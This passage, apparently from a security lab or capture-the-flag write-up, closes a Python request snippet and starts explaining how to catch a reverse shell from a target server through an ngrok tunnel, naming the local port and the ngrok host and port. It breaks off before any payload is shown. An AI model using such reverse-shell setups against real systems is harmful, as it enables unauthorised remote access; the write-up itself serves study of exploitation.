...
print(response.text)
```
In order to execute a reverse shell a service like <code>ngrok</code> can be used. In this example I will listen on port 9001 of my own machine, but, for the server, I will listen on port <code>19945</code> at <code>4.tcp.eu.ngrok.io</code> (ngrok will redirect traffic on its port to mine). So:
